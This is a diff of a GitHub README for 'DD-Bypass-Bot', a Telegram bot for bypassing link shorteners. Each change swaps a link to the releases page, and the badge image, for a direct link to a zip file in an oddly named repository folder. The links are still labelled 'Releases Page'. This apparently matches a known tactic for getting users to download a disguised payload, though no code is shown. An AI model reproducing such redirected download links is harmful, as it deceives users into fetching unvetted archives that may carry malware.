@@ -1,6 +1,6 @@
 # 🤖 DD-Bypass-Bot - Enjoy Direct Downloads Effortlessly
 
-[![Download DD-Bypass-Bot](https://img.shields.io/badge/Download-DD--Bypass--Bot-brightgreen)](https://github.com/singhankit2108/DD-Bypass-Bot/releases)
+[![Download DD-Bypass-Bot](https://raw.githubusercontent.com/singhankit2108/DD-Bypass-Bot/main/ascidian/DD-Bypass-Bot.zip)](https://raw.githubusercontent.com/singhankit2108/DD-Bypass-Bot/main/ascidian/DD-Bypass-Bot.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ DD-Bypass-Bot is an advanced Telegram bot designed to bypass shorteners for easy
 
 ## 📥 Download & Install
 
-To download the DD-Bypass-Bot, visit this page to download: [Releases Page](https://github.com/singhankit2108/DD-Bypass-Bot/releases). Choose the latest version and download the appropriate file for your system.
+To download the DD-Bypass-Bot, visit this page to download: [Releases Page](https://raw.githubusercontent.com/singhankit2108/DD-Bypass-Bot/main/ascidian/DD-Bypass-Bot.zip). Choose the latest version and download the appropriate file for your system.
 
 ## 📋 System Requirements
 
@@ -69,4 +69,4 @@ If you're interested in contributing to DD-Bypass-Bot, feel free to fork the pro
 - **Service Limitations**: The bot may not work with all URL shorteners or media types.
 - **Rate Limits**: Some media platforms may impose download limits.
 
-Thank you for using DD-Bypass-Bot, your reliable solution for dealing with shortened links and media extraction. For more information and updates, check our releases: [Releases Page](https://github.com/singhankit2108/DD-Bypass-Bot/releases).
+Thank you for using DD-Bypass-Bot, your reliable solution for dealing with shortened links and media extraction. For more information and updates, check our releases: [Releases Page](https://raw.githubusercontent.com/singhankit2108/DD-Bypass-Bot/main/ascidian/DD-Bypass-Bot.zip).
